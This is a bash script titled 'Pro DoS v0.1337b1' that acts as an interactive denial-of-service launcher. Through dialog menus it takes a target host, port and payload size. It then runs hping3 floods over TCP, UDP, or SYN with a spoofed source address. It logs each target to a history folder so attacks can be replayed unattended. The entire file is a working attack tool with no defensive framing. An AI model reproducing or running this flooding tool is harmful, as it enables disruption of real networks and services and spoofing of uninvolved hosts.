#!/bin/bash
LAST_IP=`cat ~/.dos_history/.last_dos | grep -w 'Last_IP:' | awk '{printf $2}'`
LAST_PROTOCOL=`cat ~/.dos_history/.last_dos | grep -w 'Last_Protocol:' | awk '{printf $2}'`
LAST_PORT=`cat ~/.dos_history/.last_dos | grep -w 'Last_Port:' | awk '{printf $2}'`
LAST_PAYLOAD_SIZE=`cat ~/.dos_history/.last_dos | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
LAST_SPOOF_HOST=`cat ~/.dos_history/.last_dos | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
UDP=off
TCP=off
SYN=off
if [ ${LAST_PROTOCOL} = 1 ]; then
    TCP=on
elif [ ${LAST_PROTOCOL} = 2 ]; then
    UDP=on
elif [ ${LAST_PROTOCOL} = 3 ]; then
    SYN=on
fi

if [ ${TCP} = on ]; then
    PROTOCOL=TCP
elif [ ${UDP} = on ]; then
    PROTOCOL=UDP
elif [ ${SYN} = on ]; then
    PROTOCOL=TCP
    SYN=true
fi
BACKTITLE="Pro DoS v0.1337b1"
function func_history {
echo "Protocol: ${PROTOCOL}"
echo "IP: ${LAST_IP}"
echo "Port: ${LAST_PORT}"
if [ SYN = true ]; then
    echo "SYN: Yes"
    echo "Spoof: ${LAST_SPOOF_HOST}"
else
    echo "Payload Size: ${LAST_PAYLOAD_SIZE}"
fi
if [ ${PROTOCOL} = TCP ]; then
    hping3 --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
elif [ ${PROTOCOL} = UDP ]; then
    hping3 --udp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
elif [ ${PROTOCOL} = SYN ]; then
    hping3 --flood -I eth0 -S -p ${LAST_PORT} -a ${LAST_SPOOF_HOST} ${LAST_IP}
fi
exit 0
}
#No GUI, derive parameters from the history.
if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
    func_history
fi
if [ "$1" = "History" ] || [ "$1" = "history" ]; then
    LAST_DIR=`pwd`
    cd ~/.dos_history/
    select DOS_SESSION in *; do
#    DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
    LAST_IP=`cat ${DOS_SESSION} | grep -w 'Last_IP:' | awk '{printf $2}'`
    LAST_PROTOCOL=`cat ${DOS_SESSION} | grep -w 'Last_Protocol:' | awk '{printf $2}'`
    LAST_PORT=`cat ${DOS_SESSION} | grep -w 'Last_Port:' | awk '{printf $2}'`
    LAST_PAYLOAD_SIZE=`cat ${DOS_SESSION} | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
    LAST_SPOOF_HOST=`cat ${DOS_SESSION} | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
    func_history
    done
    cd ${LAST_DIR}
fi
#7:58PM 13/01/2012
opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 10 30 3 \
1 TCP ${TCP} \
2 UDP ${UDP} \
3 SYN ${SYN} \
--stdout`

function main {
    IP=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Specify an IP address or host." 8 40 ${LAST_IP} --stdout`
    PORT=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Specify a port to attack." 8 40 ${LAST_PORT} --stdout`
    if [ "${PORT}" -gt "65535" ]; then
        dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Higher than maximum allowable port number entered." 3 55; exit 0
    fi
    PAYLOAD_SIZE=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Payload size? (1500 bytes maximum)" 8 40 ${LAST_PAYLOAD_SIZE} --stdout`
    if [ "${PAYLOAD_SIZE}" -gt 1500 ]; then
        dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --ok-label "Continue anyway" --msgbox "Warning: Most routers will drop packets that are larger than 1500 bytes." 5 80
    fi
    DATE=`date`
#No indents here as it didn't work with them.
echo "Generated ${DATE}
Last_IP: ${IP}
Last_Port: ${PORT}
Last_Protocol: ${opt}
Last_Payload_Size: ${PAYLOAD_SIZE}" | tee ~/.dos_history/.last_dos ~/.dos_history/${IP}
}

function countdown {
    dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Beginning attack in 3 seconds." 3 35
    sleep 3
    dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Attack..." 3 25
}

if [ "${opt}" = "1" ]; then
    main
    countdown
    hping3 --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
elif [ "${opt}" = "2" ]; then
    main
    countdown
    hping3 --udp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
elif [ "${opt}" = "3" ]; then
    main
    SPOOF_HOST=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What host/IP should be spoofed?" 8 40 --stdout`
    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/${IP}
    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/.last_dos
    countdown
    hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
fi